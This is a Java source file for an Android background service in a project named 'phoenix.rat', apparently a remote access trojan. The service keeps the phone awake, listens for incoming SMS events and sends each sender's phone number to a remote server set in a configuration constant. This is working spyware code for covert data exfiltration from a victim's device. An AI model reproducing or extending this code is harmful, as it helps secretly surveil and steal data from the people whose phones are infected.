package com.phoenix.rat.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.widget.Toast;

import com.mjhp.eventbus.MBus;
import com.mjhp.eventbus.interfaces.RegisterBus;
import com.phoenix.rat.confs.Config;
import com.phoenix.rat.enums.ServiceState;
import com.phoenix.rat.events.SmsMessage;
import com.phoenix.rat.helper.AsyncHttp;
import com.phoenix.rat.helper.URLHelper;

import java.net.URLEncoder;

public class HttpSenderService extends Service {

    public static ServiceState STATE = ServiceState.NOT_RUNNING;

    public HttpSenderService() {
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    public void onCreate() {
        super.onCreate();
        STATE = ServiceState.RUNNING;
        MBus.register(this);
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TAG");
        wl.acquire();
    }


    @RegisterBus
    public void getSms(SmsMessage smsMessage){
        AsyncHttp.newInstance(
                URLHelper.fromURL(Config.URL)
                        .addParam("params", smsMessage.getPhone())
                        .build()
                ,
                new AsyncHttp.ResponseListener() {
                    @Override
                    public void onResponse(String res) {
                        Toast.makeText(getApplicationContext(), res, Toast.LENGTH_LONG).show();
                    }

                    @Override
                    public void onError() {
                        Toast.makeText(getApplicationContext(), "error", Toast.LENGTH_LONG).show();
                    }
                }
        ).run();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        STATE = ServiceState.NOT_RUNNING;
        MBus.unregister(this);
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }



}
